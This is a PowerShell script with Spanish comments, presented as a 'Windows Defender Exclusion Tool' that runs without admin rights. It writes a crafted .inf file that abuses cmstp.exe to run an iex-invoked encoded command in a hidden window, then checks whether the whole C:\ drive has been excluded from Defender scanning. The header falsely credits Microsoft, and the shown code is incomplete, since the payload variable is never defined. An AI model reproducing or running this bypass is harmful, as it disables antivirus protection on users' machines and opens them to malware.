<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- CÓDIGO ORIGINAL (IGUAL) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- PARTE CRÍTICA REPARADA ---
    if ($Add) {
        try {
            # 1. Crear archivo .inf temporal (técnica original)
            $tempFile = "$env:TEMP\cmstp_$((Get-Date).Ticks).inf"
            $InfData.Replace("REPLACE", ".('iex') `"$B64Command`"") | Out-File $tempFile -Force

            # 2. Ejecutar cmstp.exe SIN ERRORES
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "cmstp.exe"
            $psi.Arguments = "/au `"$tempFile`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $process = [System.Diagnostics.Process]::Start($psi)
            $process.WaitForExit(5000)

            # 3. VERIFICACIÓN CORREGIDA (sin errores de conversión)
            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
            $exclusions = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            
            if ($exclusions -ne $null) {
                $exclusionActive = $false
                $exclusions.PSObject.Properties | ForEach-Object {
                    if ($_.Value -eq "C:\" -or $_.Value -eq 0) {
                        $exclusionActive = $true
                    }
                }

                if ($exclusionActive) {
                    Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (C:\ está excluida)" -ForegroundColor Green
                } else {
                    Write-Host "[!] Ejecutado, pero no se detectó la exclusión" -ForegroundColor Yellow
                }
            } else {
                Write-Host "[✘] No se encontró la clave de exclusiones" -ForegroundColor Red
            }

            # Limpieza
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de tu código original)
}

# --- Ejecutar si se llama directamente ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
